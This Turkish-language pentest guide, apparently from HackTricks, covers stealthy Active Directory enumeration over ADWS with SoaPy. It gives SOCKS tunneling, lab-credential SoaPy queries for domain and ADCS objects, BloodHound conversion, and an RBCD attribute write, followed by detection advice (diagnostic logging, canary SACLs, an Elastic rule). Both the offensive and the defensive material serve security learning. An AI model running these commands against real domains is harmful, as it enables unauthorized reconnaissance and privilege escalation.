# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS Nedir?

Active Directory Web Services (ADWS), **Windows Server 2008 R2'den itibaren her Domain Controller'da varsayılan olarak etkinleştirilmiştir** ve TCP **9389** üzerinde dinler. İsimden dolayı, **HTTP kullanılmamaktadır**. Bunun yerine, hizmet, özel .NET çerçeve protokolleri yığını aracılığıyla LDAP tarzı verileri açığa çıkarır:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Trafik bu ikili SOAP çerçeveleri içinde kapsüllenmiş olduğundan ve alışılmadık bir port üzerinden seyahat ettiğinden, **ADWS üzerinden yapılan enumeration, klasik LDAP/389 & 636 trafiğine göre çok daha az muhtemel olarak incelenecek, filtrelenecek veya imzalanacaktır**. Operatörler için bu, şunları ifade eder:

* Daha gizli keşif – Mavi takımlar genellikle LDAP sorgularına odaklanır.
* **Windows dışı hostlardan (Linux, macOS)** 9389/TCP'yi bir SOCKS proxy üzerinden tünelleme özgürlüğü.
* LDAP üzerinden elde edeceğiniz aynı veriler (kullanıcılar, gruplar, ACL'ler, şema vb.) ve **yazma** yeteneği (örneğin, **RBCD** için `msDs-AllowedToActOnBehalfOfOtherIdentity`).

> NOT: ADWS, birçok RSAT GUI/PowerShell aracı tarafından da kullanıldığından, trafik meşru yönetici etkinliği ile karışabilir.

## SoaPy – Yerel Python İstemcisi

[SoaPy](https://github.com/logangoins/soapy), **ADWS protokol yığınının saf Python'da tam yeniden uygulanmasıdır**. NBFX/NBFSE/NNS/NMF çerçevelerini byte byte oluşturur, böylece Unix benzeri sistemlerden .NET çalışma zamanına dokunmadan veri toplayabilirsiniz.

### Ana Özellikler

* **SOCKS üzerinden proxy desteği** (C2 implantlarından faydalı).
* LDAP `-q '(objectClass=user)'` ile aynı ince ayar arama filtreleri.
* Opsiyonel **yazma** işlemleri (`--set` / `--delete`).
* BloodHound'a doğrudan alım için **BOFHound çıktı modu**.
* İnsan okunabilirliği gerektiğinde zaman damgalarını / `userAccountControl`'ü güzelleştirmek için `--parse` bayrağı.

### Kurulum (operatör host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

Aşağıdaki iş akışı, **domain & ADCS nesnelerini** ADWS üzerinden nasıl listeleyeceğinizi, bunları BloodHound JSON formatına dönüştüreceğinizi ve sertifika tabanlı saldırı yollarını nasıl avlayacağınızı göstermektedir – tüm bunlar Linux'tan:

1. **Hedef ağdan kutunuza 9389/TCP tüneli açın** (örneğin Chisel, Meterpreter, SSH dinamik port yönlendirmesi vb. aracılığıyla). `export HTTPS_PROXY=socks5://127.0.0.1:1080` veya SoaPy’nin `--proxyHost/--proxyPort` seçeneğini kullanın.

2. **Kök alan nesnesini toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Yapılandırma NC'den ADCS ile ilgili nesneleri toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound'a Dönüştür:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP'i** BloodHound GUI'sine yükleyin ve `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` gibi cypher sorguları çalıştırarak sertifika yükseltme yollarını (ESC1, ESC8, vb.) ortaya çıkarın.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD) Yazma
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
`s4u2proxy`/`Rubeus /getticket` ile birleştirerek tam bir **Kaynak Tabanlı Kısıtlı Delegasyon** zinciri oluşturun.

## Tespit ve Güçlendirme

### Ayrıntılı ADDS Günlüğü

ADWS (ve LDAP) kaynaklı pahalı / verimsiz aramaları ortaya çıkarmak için Alan Denetleyicileri üzerinde aşağıdaki kayıt defteri anahtarlarını etkinleştirin:
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Olaylar **Directory-Service** altında tam LDAP filtresi ile görünecektir, sorgu ADWS üzerinden gelse bile.

### SACL Canary Nesneleri

1. Bir sahte nesne oluşturun (örneğin, devre dışı kullanıcı `CanaryUser`).
2. _Everyone_ ilkesi için **Audit** ACE'si ekleyin, **ReadProperty** üzerinde denetlendi.
3. Bir saldırgan `(servicePrincipalName=*)`, `(objectClass=user)` vb. işlemleri gerçekleştirdiğinde, DC gerçek kullanıcı SID'sini içeren **Event 4662**'yi yayar – istek proxy üzerinden gelse veya ADWS'den kaynaklansa bile. 

Elastic önceden oluşturulmuş kural örneği:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Araç Özeti

| Amaç | Araç | Notlar |
|------|------|--------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, okuma/yazma |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch günlüklerini dönüştürür |
| Sertifika ihlali | [Certipy](https://github.com/ly4k/Certipy) | Aynı SOCKS üzerinden proxy yapılabilir |

## Referanslar

* [SpecterOps – SOAP(y) Kullanmayı Unutmayın – ADWS Kullanarak Gizli AD Toplama için Bir Operatör Rehberi](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF spesifikasyonları](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
